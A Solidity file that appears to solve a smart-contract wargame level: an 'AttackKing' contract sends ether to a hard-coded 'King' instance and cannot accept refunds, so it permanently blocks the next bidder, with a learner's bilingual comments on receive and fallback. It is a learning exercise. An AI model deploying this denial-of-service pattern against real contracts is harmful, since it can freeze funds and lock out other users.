// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackKing {
    address payable kingAddress =
        payable(0xa363316cb597E9FC0A9DbD26d201E888fc82F06e);

    constructor() payable {}

    function setKingAttack() external {
        uint sendEthAmount = address(this).balance;

        /* @remind msg.data SI empty -> recieve */
        (bool success, ) = kingAddress.call{value: sendEthAmount}("");
        require(success, "n o t");

        /* msg.data NO empty?? -> recieve */
        /* COMENTARIO en --- https://www.youtube.com/watch?v=df6x81mMw_g&t=276s */
        /* target.transfer() -> msg.data is not empty, is that the reason? fallback will be called instead of recieve */
        // payable(kingAddress).transfer(sendEthAmount);

        /* msg.data NO empty -> fallback */
        // payable(0xa363316cb597E9FC0A9DbD26d201E888fc82F06e).call{
        //     value: sendEthAmount
        // }(abi.encodeWithSignature("dawd()"));
    }

    function viewEth() external view returns (uint amount) {
        amount = address(this).balance;
    }

    // fallback() external payable {
    //     revert();
    // }
}

contract King {
    address king;
    uint public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner, "why");
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
